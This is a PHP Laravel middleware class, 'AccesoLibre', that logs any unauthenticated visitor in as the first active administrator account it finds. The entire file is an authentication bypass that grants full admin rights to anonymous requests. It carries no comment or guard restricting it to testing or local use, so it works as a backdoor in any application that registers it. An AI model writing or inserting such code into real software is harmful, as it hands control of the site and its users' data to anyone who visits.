<?php

namespace App\Http\Middleware;

use App\Models\User;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Symfony\Component\HttpFoundation\Response;

class AccesoLibre
{
    public function handle(Request $request, Closure $next): Response
    {
        if (! Auth::check()) {
            $admin = User::where('es_admin', true)->where('activo', true)->first();

            if ($admin) {
                Auth::login($admin);
            }
        }

        return $next($request);
    }
}
